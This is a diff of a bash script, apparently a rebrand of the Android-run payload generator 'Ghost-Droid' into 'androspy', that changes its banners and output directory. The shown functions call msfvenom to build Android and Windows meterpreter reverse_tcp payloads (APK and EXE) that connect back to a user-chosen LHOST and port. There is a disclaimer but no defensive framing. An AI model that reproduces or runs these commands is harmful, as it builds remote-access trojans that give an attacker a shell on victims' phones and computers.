@@ -99,8 +99,8 @@ echo -e $ye " Me or my tool is not responsible for "
 echo "       any of your action " 
 echo " " 
 sleep 2
-figlet -f mono9 "Ghost"
-figlet -f mono9 "Droid" 
+figlet -f mono9 "androspy"
+
 sleep 2
 
 }
@@ -123,7 +123,7 @@ function exip(){
 clear
 echo " "
 echo -e $cy "   +----------------------------------------+"
-echo -e $cy "   |     ${ye}Thanks for using Ghost-Droid       ${cy}|"
+echo -e $cy "   |     ${ye}Thanks for using androspy       ${cy}|"
 echo -e $cy "   |        ${ye}See you at next time            ${cy}|"
 echo -e $cy "   |----------------------------------------|"
 echo -e $cy "   |           ${lg}Bye Bye ( ^_^)/              ${cy}|"
@@ -169,7 +169,7 @@ msfconsole
 function android(){
 
 clear
-figlet -f pagga " Ghost-Droid " | lolcat
+figlet -f pagga " androspy " | lolcat
 echo "--------------[ Generate Payload ]---------------"
 echo ""
 lhost
@@ -181,11 +181,11 @@ pname
 echo ""
 echo " [@] This could take a while........." 
 echo " "
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform android R -o /sdcard/ghost/$name.apk > /dev/null 2>&1
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform android R -o /sdcard/androspy/$name.apk > /dev/null 2>&1
 echo -e $ye " "
-echo " Generated payload is saved in ghost directory "
+echo " Generated payload is saved in androspy directory "
 echo -e $re " "
-ls /sdcard/ghost | cat -n 
+ls /sdcard/androspy | cat -n 
 echo ""
 returu
 
@@ -194,7 +194,7 @@ returu
 function windows(){
 
 clear
-figlet -f pagga " Ghost-Droid " | lolcat
+figlet -f pagga " androspy " | lolcat
 echo "--------------[ Generate Payload ]---------------"
 echo ""
 lhost
@@ -202,11 +202,11 @@ lport
 pname
 echo ""
 echo " This could take a while........."
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /sdcard/ghost/$name.exe > /dev/null 2>&1
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /sdcard/androspy/$name.exe > /dev/null 2>&1
 echo ""
-echo -e $ye " Your payload has been saved in your sdcard in the ghost directory "
+echo -e $ye " Your payload has been saved in your sdcard in the androspy directory "
 echo -e $re ""
-ls /sdcard/ghost | cat -n
+ls /sdcard/androspy | cat -n
 echo " "
 returu
 
@@ -215,7 +215,7 @@ returu
 function mac(){
 
 clear
-figlet -f pagga " Ghost-Droid " | lolcat
+figlet -f pagga " androspy " | lolcat
 echo "--------------[ Generate Payload ]---------------"
 echo ""
 lhost
